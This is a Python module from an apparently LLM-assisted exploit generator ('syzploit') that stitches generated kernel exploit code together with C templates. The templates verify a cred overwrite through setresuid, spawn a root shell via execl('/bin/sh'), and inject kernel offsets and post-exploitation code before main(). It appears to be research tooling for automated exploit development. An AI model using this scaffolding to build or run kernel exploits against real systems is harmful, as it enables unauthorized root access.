"""
exploit.stitcher — Assemble a final exploit from plan + generated components.

Combines the generated code with templates, handles includes,
and produces the final compilable source.
"""

from __future__ import annotations

from typing import Dict, Optional

from ..core.config import Config, load_config
from ..core.llm import LLMClient
from ..core.models import ExploitPlan

# ── Template registry ─────────────────────────────────────────────────

_CODE_TEMPLATES: Dict[str, str] = {
    "uid_check": """\
// ── UID verification (syzploit) ──────────────────────────────────────
// Kernel privesc changes the current process's cred struct.  After a
// cred overwrite, the real/effective/saved UIDs may not all be zero —
// only the fields at cred+4..cred+0x24 that were zeroed.  We use
// setresuid(0,0,0) as the VALIDATION GATE: this normalises all three
// UIDs to 0 if the kernel allows it (i.e. the cred has at least one
// uid field set to 0).  This matches the proven approach from real
// kernel exploits (badnode, badspin, bad_io_uring).
#include <sys/types.h>
#include <unistd.h>
static void check_uid_before(void) {
    printf("SYZPLOIT_UID_BEFORE=%d\\n", getuid());
    fflush(stdout);
}
static void check_uid_after(void) {
    // First try to VALIDATE by setting all UIDs/GIDs to 0.
    // If the cred overwrite worked, this succeeds and normalises
    // the uid/gid to 0 even if only saved-uid was zeroed.
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    uid_t uid = getuid();
    printf("SYZPLOIT_UID_AFTER=%d\\n", uid);
    fflush(stdout);
    if (uid == 0) {
        printf("[+] SUCCESS: privilege escalation confirmed! UID=0\\n");
    } else {
        printf("[-] Privilege escalation FAILED. UID=%d\\n", uid);
    }
    fflush(stdout);
}
""",
    "privilege_escalation_verify": """\
// Verify privilege escalation — uses setresuid as validation gate
static int verify_privesc(void) {
    // Normalise UIDs: if cred overwrite zeroed any uid field, this
    // will set all of real/effective/saved to 0.
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    uid_t uid = getuid();
    printf("SYZPLOIT_UID_AFTER=%d\\n", uid);
    fflush(stdout);
    if (uid == 0) {
        printf("[+] SUCCESS: privilege escalation confirmed! UID=0\\n");
        fflush(stdout);
        execl("/bin/sh", "sh", NULL);
        return 0;
    }
    printf("[-] Privilege escalation failed. UID=%d\\n", uid);
    fflush(stdout);
    return -1;
}
""",
    "error_handler": """\
#define CHECK(cond, msg) do { \\
    if (!(cond)) { \\
        perror(msg); \\
        return -1; \\
    } \\
} while(0)
""",
}


def stitch_exploit(
    plan: ExploitPlan,
    generated_code: str,
    *,
    extra_templates: Optional[Dict[str, str]] = None,
    kernel_offsets_header: str = "",
    post_exploit_code: str = "",
    cfg: Optional[Config] = None,
) -> str:
    """
    Stitch together the final exploit source from generated code and templates.

    If the generated code is already self-contained, returns it as-is with
    minor fixes (missing includes, UID checks).

    Parameters
    ----------
    kernel_offsets_header:
        If non-empty, adds ``#include "kernel_offsets.h"`` to the top.
    post_exploit_code:
        Post-exploitation C code to append (task walker, cred overwrite, etc.)
    """
    cfg = cfg or load_config()

    # Ensure standard includes
    required_includes = [
        "#include <stdio.h>",
        "#include <stdlib.h>",
        "#include <string.h>",
        "#include <unistd.h>",
        "#include <sys/types.h>",
    ]

    lines = generated_code.split("\n")
    existing_includes = {l.strip() for l in lines if l.strip().startswith("#include")}

    missing = [inc for inc in required_includes if inc not in existing_includes]
    if missing:
        # Prepend missing includes
        insert_point = 0
        for i, line in enumerate(lines):
            if line.strip().startswith("#include"):
                insert_point = i + 1
        lines = lines[: insert_point] + missing + [""] + lines[insert_point:]

    # Inject kernel_offsets.h include if header is provided
    if kernel_offsets_header and '#include "kernel_offsets.h"' not in generated_code:
        # Add right after the last #include
        include_line = '#include "kernel_offsets.h"'
        last_include = 0
        for i, line in enumerate(lines):
            if line.strip().startswith("#include"):
                last_include = i
        lines.insert(last_include + 1, include_line)

    # Ensure UID check before/after
    code = "\n".join(lines)
    if "SYZPLOIT_UID" not in code and "check_uid_before" not in code:
        # Add UID tracking template — uses getuid() from within the
        # exploit process so kernel cred changes are visible.
        uid_template = _CODE_TEMPLATES["uid_check"]
        # Insert before main()
        main_idx = code.find("int main(")
        if main_idx == -1:
            main_idx = code.find("void main(")
        if main_idx > 0:
            code = code[:main_idx] + uid_template + "\n" + code[main_idx:]

    # Inject post-exploit code if provided
    if post_exploit_code and "post_exploit" not in code:
        main_idx = code.find("int main(")
        if main_idx == -1:
            main_idx = code.find("void main(")
        if main_idx > 0:
            code = code[:main_idx] + post_exploit_code + "\n\n" + code[main_idx:]

    return code
